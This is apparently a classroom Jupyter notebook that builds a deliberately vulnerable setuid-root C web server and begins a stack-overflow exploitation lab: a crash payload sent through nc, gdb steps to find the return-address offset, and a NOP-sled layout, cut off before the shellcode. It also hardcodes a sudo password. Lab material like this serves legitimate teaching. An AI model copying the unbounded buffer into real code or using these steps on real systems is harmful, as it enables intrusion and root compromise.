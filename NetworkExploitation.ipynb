{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Exploitation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Simple Server Example\n",
    "- a server that listens for TCP connection on port 7890\n",
    "- when a client connects it sends a message *Hello World!* and receives data until connection is closed\n",
    "- booksrc/simple_server.c and booksrc/hacking.h are the two files required to build the simple server\n",
    "```\n",
    "$ g++ simple_server.c -o simple_server.exe\n",
    "$ ./simple_server.exe\n",
    "$ telnet 127.0.0.1 7890\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/simple_server.c .\n",
    "! cp ./booksrc/hacking.h ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "#define PORT 7890\t// the port users will be connecting to\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "\tint sockfd, new_sockfd;  // listen on sock_fd, new connection on new_fd\r\n",
      "\tstruct sockaddr_in host_addr, client_addr;\t// my address information\r\n",
      "\tsocklen_t sin_size;\r\n",
      "\tint recv_length=1, yes=1;\r\n",
      "\tchar buffer[1024];\r\n",
      "\r\n",
      "\tif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "\t\tfatal(\"in socket\");\r\n",
      "\r\n",
      "\tif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "\t\tfatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\t\r\n",
      "\thost_addr.sin_family = AF_INET;\t\t // host byte order\r\n",
      "\thost_addr.sin_port = htons(PORT);\t // short, network byte order\r\n",
      "\thost_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "\tmemset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "\tif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "\t\tfatal(\"binding to socket\");\r\n",
      "\r\n",
      "\tif (listen(sockfd, 5) == -1)\r\n",
      "\t\tfatal(\"listening on socket\");\r\n",
      "\r\n",
      "\twhile(1) {    // Accept loop\r\n",
      "\t\tsin_size = sizeof(struct sockaddr_in);\r\n",
      "\t\tnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "\t\tif(new_sockfd == -1)\r\n",
      "\t\t\tfatal(\"accepting connection\");\r\n",
      "\t\tprintf(\"server: got connection from %s port %d\\n\",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\r\n",
      "\t\tsend(new_sockfd, \"Hello World!\\n\", 13, 0);\r\n",
      "\t\trecv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\twhile(recv_length > 0) {\r\n",
      "\t\t\tprintf(\"RECV: %d bytes\\n\", recv_length);\r\n",
      "\t\t\tdump(buffer, recv_length);\r\n",
      "\t\t\trecv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\t}\r\n",
      "\t\tclose(new_sockfd);\r\n",
      "\t}\r\n",
      "\treturn 0;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat simple_server.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(char *message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message, 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(const unsigned char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[Ksimple_server.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Ksimple_server.c:48:3:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "   48 |   \u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(new_sockfd);\r\n",
      "      |   \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "      |   \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "! ./compile.sh simple_server.c simple_server.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run  ./simple_server.exe from terminal\n",
    "\n",
    "- notice the log as clients connect to it\n",
    "\n",
    "### install telnet client if not found"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "telnet: invalid option -- '-'\r\n",
      "Usage: telnet [-4] [-6] [-8] [-E] [-L] [-a] [-d] [-e char] [-l user]\r\n",
      "\t[-n tracefile] [ -b addr ] [-r] [host-name [port]]\r\n"
     ]
    }
   ],
   "source": [
    "! telnet --help"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S apt install telnet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run telnet client from another terminal\n",
    "- interact with the server by sending some data on telnet prompt\n",
    "- tlenet is line-buffered, hit enter to send data\n",
    "- when done enter ctrl+] to close connection on telnet client prompt >\n",
    "\n",
    "```bash\n",
    "    telnet 127.0.0.1 7890\n",
    "    this is a test from another terminal...<ENTER>\n",
    "    here's some more data...<ENTER>\n",
    "    do you read this from another terminal?\n",
    "    ctrl+]\n",
    "```\n",
    "\n",
    "### run telnet from a remote system\n",
    "- interact with the server by sending some data on telnet prompt\n",
    "- tlenet is line-buffered, hit enter to send data\n",
    "- when done enter ctrl+] to close connection on telnet client prompt >\n",
    "\n",
    "```bash\n",
    "    telnet <server ip> 7890\n",
    "    this is a test from a remote system...\n",
    "    here's some more data...\n",
    "    do you read this from another system?\n",
    "    ctrl+]\n",
    "```\n",
    "\n",
    "### check simple_serve log on the terminal\n",
    "- notice 0x0D 0x0A at the end of every data sent\n",
    "- telnet and HTTP protocols expect lines/data to be terminted with these two bytes\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char\r\n",
      "       012   10    0A    LF  '\\n' (new line)         112   74    4A    J\r\n",
      "       015   13    0D    CR  '\\r' (carriage ret)     115   77    4D    M\r\n"
     ]
    }
   ],
   "source": [
    "! man ascii | egrep \"Hex|0A|0D\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### telnet to a webserver\n",
    "- open a terminal\n",
    "- issue HEAD / HTTP/1.0 command and enter twice\n",
    "\n",
    "```bash \n",
    "    telnet www.coloradomesa.edu 80\n",
    "    HEAD / HTTP/1.0 <enter><enter>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Tinyweb Server\n",
    "- similar to simple server but uses HTTP protocol to communicate\n",
    "- handles HTTP GET and HEAD requests\n",
    "- looks for the requested resource in the local directory callled webroot and sends it to the browser\n",
    "- if the file is not found, the server responds with 404 HTTP (`File Not Found`) response\n",
    "- compile booksrc/tinyweb.c, setuid as root and run the server\n",
    "\n",
    "\n",
    "```bash\n",
    "    sudo compile.sh tinyweb.c tinyweb.exe\n",
    "    sudo chown root ./tinyweb.exe\n",
    "    sudo chmod u+s ./tinyweb.exe\n",
    "    ./tinyweb.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp booksrc/tinyweb.c .\n",
    "! cp booksrc/hacking-network.h .\n",
    "! cp booksrc/hacking.h .\n",
    "! cp booksrc/compile.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "#include \"hacking-network.h\"\r\n",
      "\r\n",
      "#define PORT 80   // the port users will be connecting to\r\n",
      "#define WEBROOT \"./webroot\" // the web server's root directory\r\n",
      "\r\n",
      "void handle_connection(int, struct sockaddr_in *); // handle web requests\r\n",
      "int get_file_size(int); // returns the filesize of open file descriptor\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "   int sockfd, new_sockfd, yes=1; \r\n",
      "   struct sockaddr_in host_addr, client_addr;   // my address information\r\n",
      "   socklen_t sin_size;\r\n",
      "\r\n",
      "   printf(\"Accepting web requests on port %d\\n\", PORT);\r\n",
      "\r\n",
      "   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "      fatal(\"in socket\");\r\n",
      "\r\n",
      "   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "      fatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\r\n",
      "   host_addr.sin_family = AF_INET;      // host byte order\r\n",
      "   host_addr.sin_port = htons(PORT);    // short, network byte order\r\n",
      "   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "   memset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "      fatal(\"binding to socket\");\r\n",
      "\r\n",
      "   if (listen(sockfd, 20) == -1)\r\n",
      "      fatal(\"listening on socket\");\r\n",
      "\r\n",
      "   while(1) {   // Accept loop\r\n",
      "      sin_size = sizeof(struct sockaddr_in);\r\n",
      "      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "      if(new_sockfd == -1)\r\n",
      "         fatal(\"accepting connection\");\r\n",
      "\r\n",
      "      handle_connection(new_sockfd, &client_addr);\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\r\n",
      "/* This function handles the connection on the passed socket from the\r\n",
      " * passed client address.  The connection is processed as a web request\r\n",
      " * and this function replies over the connected socket.  Finally, the \r\n",
      " * passed socket is closed at the end of the function.\r\n",
      " */\r\n",
      "void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\r\n",
      "   unsigned char *ptr, request[500], resource[500];\r\n",
      "   int fd, length;\r\n",
      "\r\n",
      "   length = recv_line(sockfd, request);\r\n",
      "\r\n",
      "   printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\r\n",
      "\r\n",
      "   ptr = strstr(request, \" HTTP/\"); // search for valid looking request\r\n",
      "   if(ptr == NULL) { // then this isn't valid HTTP\r\n",
      "      printf(\" NOT HTTP!\\n\");\r\n",
      "   } else {\r\n",
      "      *ptr = 0; // terminate the buffer at the end of the URL\r\n",
      "      ptr = NULL; // set ptr to NULL (used to flag for an invalid request)\r\n",
      "      if(strncmp(request, \"GET \", 4) == 0)  // get request\r\n",
      "         ptr = request+4; // ptr is the URL\r\n",
      "      if(strncmp(request, \"HEAD \", 5) == 0) // head request\r\n",
      "         ptr = request+5; // ptr is the URL\r\n",
      "\r\n",
      "      if(ptr == NULL) { // then this is not a recognized request\r\n",
      "         printf(\"\\tUNKNOWN REQUEST!\\n\");\r\n",
      "      } else { // valid request, with ptr pointing to the resource name\r\n",
      "         if (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'\r\n",
      "            strcat(ptr, \"index.html\");     // add 'index.html' to the end\r\n",
      "         strcpy(resource, WEBROOT);     // begin resource with web root path\r\n",
      "         strcat(resource, ptr);         //  and join it with resource path\r\n",
      "         fd = open(resource, O_RDONLY, 0); // try to open the file\r\n",
      "         printf(\"\\tOpening \\'%s\\'\\t\", resource);\r\n",
      "         if(fd == -1) { // if file is not found\r\n",
      "            printf(\" 404 Not Found\\n\");\r\n",
      "            send_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\r\n",
      "            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "            send_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\r\n",
      "            send_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\r\n",
      "         } else {      // otherwise, serve up the file\r\n",
      "            printf(\" 200 OK\\n\");\r\n",
      "            send_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\r\n",
      "            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "            if(ptr == request + 4) { // then this is a GET request\r\n",
      "               if( (length = get_file_size(fd)) == -1)\r\n",
      "                  fatal(\"getting resource file size\");\r\n",
      "               if( (ptr = (unsigned char *) malloc(length)) == NULL)\r\n",
      "                  fatal(\"allocating memory for reading resource\");\r\n",
      "               read(fd, ptr, length); // read the file into memory\r\n",
      "               send(sockfd, ptr, length, 0);  // send it to socket\r\n",
      "               free(ptr); // free file memory\r\n",
      "            }\r\n",
      "            close(fd); // close the file\r\n",
      "         } // end if block for file found/not found\r\n",
      "      } // end if block for valid request\r\n",
      "   } // end if block for valid HTTP\r\n",
      "   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts an open file descriptor and returns     \r\n",
      " * the size of the associated file.  Returns -1 on failure.\r\n",
      " */\r\n",
      "int get_file_size(int fd) {\r\n",
      "   struct stat stat_struct;\r\n",
      "\r\n",
      "   if(fstat(fd, &stat_struct) == -1)\r\n",
      "      return -1;\r\n",
      "   return (int) stat_struct.st_size;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat tinyweb.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 52\r\n",
      "-rwxr-xr-x 1 kali kali 46794 Sep 16 16:24 image.jpg\r\n",
      "-rw-r--r-- 1 kali kali   261 Sep 16 16:24 index.html\r\n"
     ]
    }
   ],
   "source": [
    "! cp -r booksrc/webroot .\n",
    "! ls -l webroot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\r\n",
      "<head><title>A sample webpage</title></head>\r\n",
      "<body bgcolor=\"#000000\" text=\"#ffffffff\">\r\n",
      "<center>\r\n",
      "<h1>This is a sample webpage</h1>\r\n",
      "...and here is some sample text<br>\r\n",
      "<br>\r\n",
      "..and even a sample image:<br>\r\n",
      "<img src=\"image.jpg\"><br>\r\n",
      "</center>\r\n",
      "</body>\r\n",
      "</html>\r\n"
     ]
    }
   ],
   "source": [
    "! cat webroot/index.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/* This function accepts a socket FD and a ptr to the null terminated\r\n",
      " * string to send.  The function will make sure all the bytes of the\r\n",
      " * string are sent.  Returns 1 on success and 0 on failure.\r\n",
      " */\r\n",
      "int send_string(int sockfd, unsigned char *buffer) {\r\n",
      "   int sent_bytes, bytes_to_send;\r\n",
      "   bytes_to_send = strlen(buffer);\r\n",
      "   while(bytes_to_send > 0) {\r\n",
      "      sent_bytes = send(sockfd, buffer, bytes_to_send, 0);\r\n",
      "      if(sent_bytes == -1)\r\n",
      "         return 0; // return 0 on send error\r\n",
      "      bytes_to_send -= sent_bytes;\r\n",
      "      buffer += sent_bytes;\r\n",
      "   }\r\n",
      "   return 1; // return 1 on success\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to a destination\r\n",
      " * buffer.  It will receive from the socket until the EOL byte\r\n",
      " * sequence in seen.  The EOL bytes are read from the socket, but\r\n",
      " * the destination buffer is terminated before these bytes.\r\n",
      " * Returns the size of the read line (without EOL bytes).\r\n",
      " */\r\n",
      "int recv_line(int sockfd, unsigned char *dest_buffer) {\r\n",
      "#define EOL \"\\r\\n\" // End-Of-Line byte sequence\r\n",
      "#define EOL_SIZE 2\r\n",
      "   unsigned char *ptr;\r\n",
      "   int eol_matched = 0;\r\n",
      "\r\n",
      "   ptr = dest_buffer;\r\n",
      "   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte\r\n",
      "      if(*ptr == EOL[eol_matched]) { // does this byte match terminator\r\n",
      "         eol_matched++;\r\n",
      "         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,\r\n",
      "            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string\r\n",
      "            return strlen(dest_buffer); // return bytes recevied\r\n",
      "         }\r\n",
      "      } else {\r\n",
      "         eol_matched = 0;\r\n",
      "      }   \r\n",
      "      ptr++; // increment the pointer to the next byter;\r\n",
      "   }\r\n",
      "   return 0; // didn't find the end of line characters\r\n",
      "}\r\n",
      "\r\n",
      "\r\n",
      "/* Structure for Ethernet headers */\r\n",
      "#define ETHER_ADDR_LEN 6\r\n",
      "#define ETHER_HDR_LEN 14\r\n",
      "\r\n",
      "struct ether_hdr {\r\n",
      "   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\r\n",
      "   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\r\n",
      "   unsigned short ether_type; // Type of Ethernet packet\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Internet Protocol (IP) headers */\r\n",
      "struct ip_hdr {\r\n",
      "   unsigned char ip_version_and_header_length; // version and header length combined\r\n",
      "   unsigned char ip_tos;          // type of service\r\n",
      "   unsigned short ip_len;         // total length\r\n",
      "   unsigned short ip_id;          // identification number\r\n",
      "   unsigned short ip_frag_offset; // fragment offset and flags\r\n",
      "   unsigned char ip_ttl;          // time to live\r\n",
      "   unsigned char ip_type;         // protocol type\r\n",
      "   unsigned short ip_checksum;    // checksum\r\n",
      "   unsigned int ip_src_addr;      // source IP address\r\n",
      "   unsigned int ip_dest_addr;     // destination IP address\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Transmission Control Protocol (TCP) headers */\r\n",
      "struct tcp_hdr {\r\n",
      "   unsigned short tcp_src_port;   // source TCP port\r\n",
      "   unsigned short tcp_dest_port;  // destination TCP port\r\n",
      "   unsigned int tcp_seq;          // TCP sequence number\r\n",
      "   unsigned int tcp_ack;          // TCP acknowledgement number\r\n",
      "   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space\r\n",
      "   unsigned char tcp_offset:4;    // TCP data offset for little endian host\r\n",
      "   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)\r\n",
      "#define TCP_FIN   0x01\r\n",
      "#define TCP_SYN   0x02\r\n",
      "#define TCP_RST   0x04\r\n",
      "#define TCP_PUSH  0x08\r\n",
      "#define TCP_ACK   0x10\r\n",
      "#define TCP_URG   0x20\r\n",
      "   unsigned short tcp_window;     // TCP window size\r\n",
      "   unsigned short tcp_checksum;   // TCP checksum\r\n",
      "   unsigned short tcp_urgent;     // TCP urgent pointer\r\n",
      "};\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking-network.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: \u001b[01m\u001b[Ktinyweb.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Khandle_connection\u001b[m\u001b[K’:\n",
      "\u001b[01m\u001b[Ktinyweb.c:101:16:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kread\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfread\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\n",
      "  101 |                \u001b[01;35m\u001b[Kread\u001b[m\u001b[K(fd, ptr, length); // read the file into memory\n",
      "      |                \u001b[01;35m\u001b[K^~~~\u001b[m\u001b[K\n",
      "      |                \u001b[32m\u001b[Kfread\u001b[m\u001b[K\n",
      "\u001b[01m\u001b[Ktinyweb.c:105:13:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\n",
      "  105 |             \u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd); // close the file\n",
      "      |             \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\n",
      "      |             \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh tinyweb.c tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(char *message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message, 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(const unsigned char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chown root:root ./tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 root root 22488 Sep 18 14:22 tinyweb.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chmod u+s ./tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-xr-x 1 root root 22488 Sep 18 14:22 tinyweb.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al tinyweb.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run tinyweb.exe from a terminal\n",
    "### open a browser and browse to localhost"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tinyweb Stack Overflow Exploitation\n",
    "\n",
    "- crash the Tinyweb server\n",
    "- pawn the system\n",
    "\n",
    "## Crash the Tinyweb server\n",
    "\n",
    "- use a different VM or a machine (attacker machine)\n",
    "- generate a junk data of 1000 bytes and send it to the server\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'print(\"A\"*1000, end=\"\\r\\n\")' > junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# replace telnet_serverip and port\n",
    "\n",
    "! cat junk.txt | nc -v [severip] [port]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Pawn the system\n",
    "\n",
    "- find the overlfow vulnerability\n",
    "- find the return address and offset from request buffer\n",
    "- run the tinyweb.exe and get its process id to attach it to the gdb\n",
    "\n",
    "```bash\n",
    "$ ps aux | grep tinyweb\n",
    "```\n",
    "\n",
    "- Attach gdb to the tinyweb server\n",
    "\n",
    "```\n",
    "$ sudo gdb -q --pid=[tinywebpid] --symbols=./tinyweb.exe\n",
    "```\n",
    "\n",
    "- use gdb to examine memory and addresses\n",
    "\n",
    "```bash\n",
    "$ list\n",
    "$ list main\n",
    "$ list 44 # list 10 lines around line #44\n",
    "$ break 62 # break at recv_line function that has overrun issue\n",
    "$ continue # make a get request using a terminal or browser to hit the breakpoint\n",
    "$ print request\n",
    "$ print /x &request # Note the address of request variable\n",
    "$ x/16wx request+500 # examine 16 words at request+500 bytes in stack - return address must be definitely 500 bytes away from request!\n",
    "$ bt  # gives the return address to main\n",
    "$ x/x $ebp+4 # prints the return address\n",
    "$ p /u <return address> - <request address> # OFFSET to return address: 524 bytes\n",
    "```\n",
    "\n",
    "- exit the debugger and rerun the server on the same terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Local Shellcode Exploit\n",
    "- create a exploit code and send it to the server\n",
    "- use a different terminal on the same system\n",
    "- total length of string buffer is the offset or difference between the return address - request buffer + 4 bytes\n",
    "\n",
    "```\n",
    "| repeated NOP SLED \\x90 | exploit code | repeated controlled return addrees that will land somewhere in NOP SLED |\n",
    "\n",
    "```\n",
    "\n",
    "- total length - exploit code length - 30 x return address\n",
    "\n",
